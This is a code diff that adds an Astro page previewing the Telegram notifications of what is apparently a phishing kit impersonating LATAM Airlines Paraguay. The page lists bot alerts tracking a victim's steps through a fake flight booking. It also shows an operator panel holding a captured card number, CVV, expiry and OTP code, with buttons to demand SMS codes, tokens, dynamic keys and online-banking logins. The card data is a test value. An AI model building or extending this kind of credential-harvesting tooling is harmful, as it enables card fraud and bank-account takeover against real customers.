@@ -1,0 +1,171 @@
+---
+export const prerender = false;
+
+const pageMessages = [
+  '🌐 IP: 181.120.14.22 🇵🇾 Asunción, Paraguay',
+  'Buscando vuelos',
+  'Eligiendo vuelo de ida',
+  'Eligiendo vuelo de vuelta',
+  'Viendo resumen de vuelos',
+  'Escogiendo asiento ida',
+  'Escogiendo asientos vuelta',
+  'Escogiendo maletas',
+  'Datos de pasajero',
+  'Pagina de pago',
+  'Abrio banner de pago',
+  '✅ Ingreso datos cc',
+  'Devuelta a ingresar tarjeta',
+  'Compra exitosa',
+];
+
+const paymentPreview = [
+  '✈️ TARJETAS PANEL',
+  '━━━━━━━━━━━━━━━━━━',
+  '💵 Monto: $ 1654.80',
+  '',
+  '💳 DATOS DE PAGO',
+  '👤 Titular: JUAN PEREZ',
+  '🏷️ Marca: VISA',
+  '💳 Tarjeta: 4111111111111111',
+  '📅 Expira: 12/28',
+  '📅 CVV: 123',
+  '',
+  '📅 Nivel: -',
+  '📅 Banco: -',
+  '📅 País: -',
+  '',
+  '💰 OTP',
+  '💵 Código: 482910',
+  '🔑 Token: -',
+  '👤 Usuario: -',
+  '🔒 Contraseña: -',
+  '📱 Clave dinámica: -',
+  '━━━━━━━━━━━━━━━━━━',
+].join('\n');
+
+const paymentButtons = [
+  'Pedir SMS',
+  'Pedir Tarjeta',
+  'Pedir Token',
+  'Pedir Clave dinámica',
+  'Pedir Usuario y Contraseña',
+  'Finalizar',
+];
+---
+
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Vista Telegram | LATAM Paraguay</title>
+  </head>
+  <body>
+    <main class="tg-preview">
+      <header class="tg-preview__head">
+        <h1>Así llega a Telegram</h1>
+        <p>Solo es una vista previa del mensaje. Esta página no envía nada al chat.</p>
+      </header>
+
+      <section class="tg-preview__block">
+        <h2>1. Avisos de cada paso</h2>
+        <p>Cuando la persona entra a una pantalla, el bot manda solo este texto:</p>
+        <div class="tg-chat" aria-label="Vista de avisos de página">
+          {pageMessages.map((text) => (
+            <article class="tg-bubble">
+              <p class="tg-bubble__name">LATAM bot</p>
+              <pre>{text}</pre>
+            </article>
+          ))}
+        </div>
+      </section>
+
+      <section class="tg-preview__block">
+        <h2>2. Aviso de pago</h2>
+        <p>Cuando envían tarjeta, OTP, token, clave dinámica o usuario y contraseña, llega este panel con los botones del operador:</p>
+        <div class="tg-chat" aria-label="Vista del panel de pago">
+          <article class="tg-bubble tg-bubble--panel">
+            <p class="tg-bubble__name">LATAM bot</p>
+            <pre>{paymentPreview}</pre>
+            <div class="tg-keys">
+              {paymentButtons.map((label) => (
+                <span class="tg-key">{label}</span>
+              ))}
+            </div>
+          </article>
+        </div>
+      </section>
+    </main>
+
+    <style is:global>
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        background: #e8eef4;
+        font-family: Arial, sans-serif;
+        color: #1b0032;
+      }
+      .tg-preview {
+        max-width: 720px;
+        margin: 0 auto;
+        padding: 28px 20px 64px;
+      }
+      .tg-preview__head h1 {
+        margin: 0 0 8px;
+        font-size: 28px;
+      }
+      .tg-preview__head p,
+      .tg-preview__block > p {
+        margin: 0 0 16px;
+        line-height: 1.45;
+        color: #4a4458;
+      }
+      .tg-preview__block h2 {
+        margin: 28px 0 8px;
+        font-size: 18px;
+      }
+      .tg-chat {
+        background: #0e1621;
+        border-radius: 16px;
+        padding: 16px 14px 18px;
+        display: grid;
+        gap: 10px;
+      }
+      .tg-bubble {
+        justify-self: start;
+        max-width: 92%;
+        background: #182533;
+        color: #fff;
+        border-radius: 12px 12px 12px 4px;
+        padding: 8px 12px 10px;
+      }
+      .tg-bubble__name {
+        margin: 0 0 4px;
+        font-size: 12px;
+        color: #6ab2f2;
+        font-weight: 700;
+      }
+      .tg-bubble pre {
+        margin: 0;
+        font-family: inherit;
+        font-size: 15px;
+        line-height: 1.35;
+        white-space: pre-wrap;
+      }
+      .tg-keys {
+        display: grid;
+        gap: 6px;
+        margin-top: 10px;
+      }
+      .tg-key {
+        display: block;
+        text-align: center;
+        padding: 8px 10px;
+        border: 1px solid #3d6a94;
+        border-radius: 8px;
+        color: #6ab2f2;
+        font-size: 14px;
+        background: #12202e;
+      }
+    </style>
+  </body>
+</html>
